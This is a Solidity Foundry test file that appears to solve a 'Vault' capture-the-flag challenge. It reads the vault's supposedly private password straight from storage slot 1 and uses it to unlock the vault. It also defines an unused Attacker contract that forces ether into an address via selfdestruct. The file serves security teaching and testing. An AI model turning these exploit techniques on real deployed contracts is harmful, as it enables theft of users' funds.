// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Vault.sol";

contract Attacker {
    constructor() payable {}

    function attack(address force) external {
        selfdestruct(payable(force));
    }
}

contract VaultTest is Test {
    Vault internal _vault;

    function setUp() public {
        _vault = new Vault("A very strong secret password :)");
    }

    function test_attack() public {
        _vault.unlock(vm.load(address(_vault), bytes32(uint256(1))));

        assertFalse(_vault.locked(), "locked");
    }
}